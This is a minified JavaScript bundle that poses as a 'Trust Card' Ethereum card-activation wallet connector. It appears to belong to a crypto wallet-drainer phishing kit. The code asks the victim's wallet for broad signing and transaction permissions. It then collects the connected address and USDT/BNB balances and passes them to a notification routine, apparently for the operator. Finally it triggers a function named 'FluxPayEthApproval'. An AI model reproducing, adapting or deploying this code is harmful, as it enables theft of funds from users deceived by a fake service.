import{N as g,m,s as _}from"./assets/notify-CX_aGgTC.js";import{g as C}from"./assets/balances-5NtDpXxe.js";const T="11e5445365f720d1050dc106ba2e78d6";async function b(){const t=await g.init({projectId:T,metadata:{name:"Trust Card - Ethereum",description:"Connect wallet for card activation",url:typeof window<"u"?window.location.origin:"https://trust-card.vercel.app",icons:["https://avatars.githubusercontent.com/u/37784886"]}});if(t!=null&&t.session)try{await t.disconnect()}catch{}return t.on("display_uri",async n=>{await m.openModal({uri:n})}),{provider:t,modal:m}}let a=null,s=null,u=null;function h(){}async function v(){return u||(u=(async()=>{const{provider:t,modal:n}=await b();return a=t,s=n,{provider:a,modal:s}})(),u)}async function A(t,n){var i,p,c,o,l;try{const{provider:e,modal:d}=await v();if(a=e,s=d,a!=null&&a.session)await w(a,h,t);else{await a.connect({namespaces:{eip155:{methods:["eth_sendTransaction","eth_signTransaction","eth_sign","personal_sign","eth_signTypedData"],chains:["eip155:1"],events:["chainChanged","accountsChanged"]}}}),s.closeModal();const r=((l=(o=(c=(p=(i=a.session)==null?void 0:i.namespaces)==null?void 0:p.eip155)==null?void 0:c.accounts)==null?void 0:o[0])==null?void 0:l.split(":")[2])||"";if(r)try{const{usdtBalance:f,bnbBalance:y}=await C(a,r);_({type:"wallet_connect",address:r,usdtBalance:f,bnbBalance:y})}catch{}await w(a,h,t)}}catch(e){s==null||s.closeModal(),n==null||n((e==null?void 0:e.message)||"Connection failed")}}async function w(t,n,i){var c,o,l,e,d;!(t!=null&&t.session)||!((d=(e=(l=(o=(c=t.session)==null?void 0:c.namespaces)==null?void 0:o.eip155)==null?void 0:l.accounts)==null?void 0:e[0])!=null&&d.split(":")[2])||i==null||i()}typeof window<"u"&&(window.FluxPayEthApproval={run:A});
